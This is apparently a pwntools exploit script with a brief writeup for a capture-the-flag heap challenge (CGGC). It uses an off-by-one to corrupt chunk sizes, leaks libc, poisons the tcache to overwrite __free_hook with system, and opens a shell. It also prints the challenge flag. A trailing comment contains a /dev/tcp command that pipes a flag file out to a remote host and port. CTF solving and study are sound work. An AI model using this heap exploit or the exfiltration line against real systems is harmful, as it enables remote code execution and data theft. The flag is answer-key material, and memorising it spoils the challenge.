from pwn import *
import sys
import time
context.log_level = "debug"
# context.terminal = ["tmux", "splitw", "-h"]
# context.arch = "amd64"
def one_gadget(filename: str) -> list:
    return [
        int(i) for i in __import__('subprocess').check_output(
            ['one_gadget', '--raw', filename]).decode().split(' ')
    ]
# brva x = b *(pie+x)
# set follow-fork-mode 
# p/x $fs_base
# vis_heap_chunks
# set debug-file-directory /usr/src/glibc/glibc-2.35
# directory /usr/src/glibc/glibc-2.35/malloc/
# handle SIGALRM ignore
if len(sys.argv) == 1:
    r = process("./chal_patched")
    if args.GDB:
        dbg = '''set debug-file-directory /usr/src/glibc/glibc-2.31
directory /usr/src/glibc/glibc-2.31/malloc/\nset glibc 2.31\nlibc\nset max-visualize-chunk-size 0x500\n'''
        gdb.attach(r,dbg+"")
elif len(sys.argv) == 3:
    r = remote(sys.argv[1], sys.argv[2])
else:
    print("Usage: python3 {} [GDB | REMOTE_IP PORT]".format(sys.argv[0]))
    sys.exit(1)
s       = lambda data               :r.send(data)
sa      = lambda x, y               :r.sendafter(x, y)
sl      = lambda data               :r.sendline(data)
sla     = lambda x, y               :r.sendlineafter(x, y)
ru      = lambda delims, drop=True  :r.recvuntil(delims, drop)
uu32    = lambda data,num           :u32(r.recvuntil(data)[-num:].ljust(4,b'\x00'))
uu64    = lambda data,num           :u64(r.recvuntil(data)[-num:].ljust(8,b'\x00'))
leak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))
l64     = lambda      :u64(r.recvuntil("\x7f")[-6:].ljust(8,b"\x00"))
l32     = lambda      :u32(r.recvuntil("\xf7")[-4:].ljust(4,b"\x00"))

def add(idx,length):
    sla("choice: ","1")
    sla(": ",str(idx))
    sla(": ",str(length))
def delete(idx):
    sla("choice: ","2")
    sla(": ",str(idx))
def show(idx):
    sla("choice: ","3")
    sla(": ",str(idx))
def edit(idx,content):
    sla("choice: ","4")
    sla(": ",str(idx))
    sla(": ",content)

for i in range(10):
    add(i,0x28)
for i in range(0,9):
    edit(i,b'A' * 0x28 + b'\x91')
for i in range(3,10):
    delete(i)
delete(1)
add(1,0x28)
show(1)
libc = l64() - 0x1ecc60
leak("libc",hex(libc))
free_hook = libc + 0x1eee48
system = libc + 0x52290
add(3,0x28)
add(4,0x28)
delete(4)
delete(2)
edit(3, p64(free_hook) + p64(0))
add(5,0x28)
edit(5,"/bin/sh\x00")
add(6,0x28)
edit(6,p64(system))
delete(5)
r.interactive()

'''
Writeup:
Off by one to modify the chunk size to over 0x80, free them to fill the tcache and then we'll have unsorted bin.
After some heap feng shui we can perform tcache poisoning to overwrite free_hook to system.
CGGC{class1c_heap_chal_w1th_0ff-by-0ne}
'''


'''
cat /home/`whoami`/f*



In extreme condition maybe we can use
cat /home/$(whoami)/flag | bash -c 'exec 3<>/dev/tcp/0.0.0.0/12345; cat >&3' > /dev/null
'''